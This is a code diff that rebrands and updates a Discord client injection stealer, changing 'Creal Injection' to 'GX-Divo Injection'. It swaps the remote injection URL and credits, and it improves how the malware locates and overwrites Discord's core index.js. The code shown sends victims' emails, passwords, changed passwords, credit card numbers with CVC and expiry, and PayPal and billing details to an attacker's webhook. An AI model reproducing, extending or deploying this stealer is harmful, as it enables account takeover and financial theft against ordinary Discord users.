@@ -6,18 +6,16 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', 
-  webhook_protector_key: '%WEBHOOK_KEY%', 
+  webhook: '%WEBHOOK%',
+  webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false, 
   ping_on_run: true, 
-  ping_val: '@everyone',
-  embed_name: 'Creal Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
+  ping_val: '@everyone', 
+  embed_name: 'GX-Divo Injection', 
+  embed_icon: 'https://i.imgur.com/Zi9wtJ3.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
-  /**
-   
-   **/
+  injection_url: 'https://raw.githubusercontent.com/GXXor/XOR-injection/main/index.js', 
+
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -414,7 +412,8 @@ function updateCheck() {
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
-  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
+  const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
+  const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
   const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -589,6 +588,9 @@ const getBadges = (flags) => {
     case 131072:
       badges += 'Verified Bot Developer, ';
       break;
+    case 4194304:
+      badges += 'Active Developer, ';
+      break;
     case 4:
       badges += 'Hypesquad Event, ';
       break;
@@ -660,12 +662,12 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Info**',
+            name: ':identification_card: **Account Info**',
             value: `Email: **${email}** - Password: **${password}**`,
             inline: false,
           },
           {
-            name: '**Discord Info**',
+            name: ':printer: **Discord Info**',
             value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: false,
           },
@@ -679,8 +681,9 @@ const login = async (email, password, token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
-        footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+		footer: {
+            text: '🎉・Discord Injection By GX-Divo | XOR',
+            icon_url: 'https://i.imgur.com/Zi9wtJ3.png',
         },
       },
     ],
@@ -702,12 +705,12 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
+            name: ':closed_lock_with_key: **Password Changed**',
             value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
+            name: ':printer: **Discord Info**',
             value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
@@ -721,8 +724,9 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
-        footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+		footer: {
+            text: '🎉・Discord Injection By GX-Divo | XOR',
+            icon_url: 'https://i.imgur.com/Zi9wtJ3.png',
         },
       },
     ],
@@ -744,12 +748,12 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Email Changed**',
+            name: ':envelope_with_arrow: **Email Changed**',
             value: `New Email: **${email}**\nPassword: **${password}**`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
+            name: ':printer: **Discord Info**',
             value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
@@ -763,8 +767,9 @@ const emailChanged = async (email, password, token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
-        footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+		footer: {
+            text: '🎉・Discord Injection By GX-Divo | XOR',
+            icon_url: 'https://i.imgur.com/Zi9wtJ3.png',
         },
       },
     ],
@@ -791,7 +796,7 @@ const PaypalAdded = async (token) => {
             inline: false,
           },
           {
-            name: '**Discord Info**',
+            name: ':printer: **Discord Info**',
             value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: false,
           },
@@ -805,8 +810,9 @@ const PaypalAdded = async (token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
-        footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+		footer: {
+            text: '🎉・Discord Injection By GX-Divo | XOR',
+            icon_url: 'https://i.imgur.com/Zi9wtJ3.png',
         },
       },
     ],
@@ -828,12 +834,12 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Credit Card Added**',
+            name: ':credit_card: **Credit Card Added**',
             value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
+            name: ':printer: **Discord Info**',
             value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
@@ -847,8 +853,9 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
-        footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+		footer: {
+            text: '🎉・Discord Injection By GX-Divo | XOR',
+            icon_url: 'https://i.imgur.com/Zi9wtJ3.png',
         },
       },
     ],
@@ -877,7 +884,7 @@ const nitroBought = async (token) => {
             inline: true,
           },
           {
-            name: '**Discord Info**',
+            name: ':printer: **Discord Info**',
             value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
@@ -891,8 +898,9 @@ const nitroBought = async (token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
-        footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+		footer: {
+            text: '🎉・Discord Injection By GX-Divo | XOR',
+            icon_url: 'https://i.imgur.com/Zi9wtJ3.png',
         },
       },
     ],
